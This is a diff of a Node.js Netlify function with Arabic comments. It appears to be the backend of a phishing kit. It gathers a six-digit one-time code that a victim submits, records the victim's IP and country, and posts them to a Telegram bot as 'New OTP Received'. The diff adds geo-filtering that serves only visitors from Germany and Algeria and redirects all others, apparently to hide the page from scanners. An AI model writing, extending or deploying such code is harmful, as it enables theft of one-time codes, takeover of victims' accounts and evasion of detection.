@@ -1,15 +1,15 @@
 const fetch = require('node-fetch');
 
-// دالة مساعدة لجلب IP من رؤوس مختلفة (لبيئة Netlify)
+// الدول المسموح بها: ألمانيا (DE) والجزائر (DZ)
+const ALLOWED_COUNTRIES = ['DE', 'DZ']; 
+
 const getClientIp = (headers) => {
-    // محاولة التقاط IP من الرؤوس الأكثر موثوقية في Netlify
     return headers['x-nf-client-connection-ip'] || 
            headers['client-ip'] || 
            headers['x-forwarded-for'] ||
            'غير متوفر';
 };
 
-// دالة ترميز الأحرف الخاصة بـ MarkdownV2 لـ Telegram
 const escapeMarkdownV2 = (text) => {
     const replacements = {
         '\\': '\\\\', '_': '\\_', '*': '\\*', '[': '\\[', ']': '\\]', 
@@ -25,33 +25,50 @@ exports.handler = async (event, context) => {
         return { statusCode: 405, body: "Method Not Allowed" };
     }
     
+    const ip = getClientIp(event.headers); 
+    const countryCode = event.headers['x-nf-client-country'] || 'غير متوفر'; // جلب رمز البلد
+    
+    // ----------------------------------------------------------------
+    // 1. تقييد الوصول الجغرافي (Geo-Restriction Check)
+    // ----------------------------------------------------------------
+    if (!ALLOWED_COUNTRIES.includes(countryCode)) {
+        console.log(`[BLOCKED OTP GEO] Access denied from Country: ${countryCode} (IP: ${ip})`);
+        
+        // التحويل إلى صفحة الانتظار أو تسجيل الدخول لمنع الاستخدام
+        return {
+            statusCode: 303,
+            headers: {
+                Location: '/waiting.html', 
+            },
+        };
+    }
+    
+    // ----------------------------------------------------------------
+    // 2. معالجة OTP (الزوار المسموح لهم)
+    // ----------------------------------------------------------------
+    
     const bodyParams = new URLSearchParams(event.body);
     
-    // تجميع حقول OTP الستة
     let otpCode = '';
     for (let i = 1; i <= 6; i++) {
+        // نستخدم bodyParams.get مباشرة بدلاً من htmlspecialchars في Node.js
         otpCode += bodyParams.get(`otp${i}`) || '';
     }
     
-    // التقاط IP باستخدام الدالة المساعدة
-    const ip = getClientIp(event.headers); 
-
-    // تطبيق الترميز
     const safe_otp = escapeMarkdownV2(otpCode);
     const safe_ip = escapeMarkdownV2(ip);
+    const safe_country = escapeMarkdownV2(countryCode); // ترميز البلد
 
-    // تشكيل الرسالة
     let message_text = `🔑 *New OTP Received \\(Donsaa\\)* 🔑\n\n`;
+    message_text += `Country: \`${safe_country}\`\n`; // إضافة البلد للرسالة
     message_text += `OTP Code: \`${safe_otp}\`\n`;
     message_text += `IP: \`${safe_ip}\``; 
 
-    // إعدادات Telegram
     const TELEGRAM_BOT_TOKEN = process.env.TELEGRAM_BOT_TOKEN;
     const TELEGRAM_CHAT_ID = process.env.TELEGRAM_CHAT_ID;
     
     if (!TELEGRAM_BOT_TOKEN || !TELEGRAM_CHAT_ID) {
         console.error("Telegram credentials missing in environment variables.");
-        // التحويل إلى صفحة الشكر بالرغم من الخطأ
         return { statusCode: 303, headers: { Location: '/thankyou.html' } };
     }
     
@@ -63,7 +80,6 @@ exports.handler = async (event, context) => {
         parse_mode: 'MarkdownV2',
     };
 
-    // إرسال البيانات إلى Telegram
     try {
         await fetch(TELEGRAM_API_URL, {
             method: 'POST',
@@ -74,7 +90,6 @@ exports.handler = async (event, context) => {
         console.error("Error sending message to Telegram:", error);
     }
     
-    // التحويل إلى الوجهة النهائية (يجب إنشاء ملف thankyou.html)
     return {
         statusCode: 303,
         headers: {
